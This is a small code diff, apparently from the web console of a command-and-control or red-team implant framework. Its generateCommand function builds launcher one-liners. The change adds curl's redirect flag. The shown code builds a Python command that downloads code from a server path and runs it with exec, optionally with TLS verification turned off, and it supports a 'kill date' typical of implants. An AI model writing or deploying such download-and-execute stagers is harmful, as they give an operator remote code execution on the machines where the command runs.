@@ -415,7 +415,7 @@
 
         function generateCommand(url, enableKillDate, killDate, trustedCert) {
             url = (url || '').replace(/\/+$/, '');
-            const curlOption = trustedCert ? '-s' : '-ks';
+            const curlOption = trustedCert ? '-sL' : '-ksL';
             const pythonCode = trustedCert
                 ? `"import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"`
                 : `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
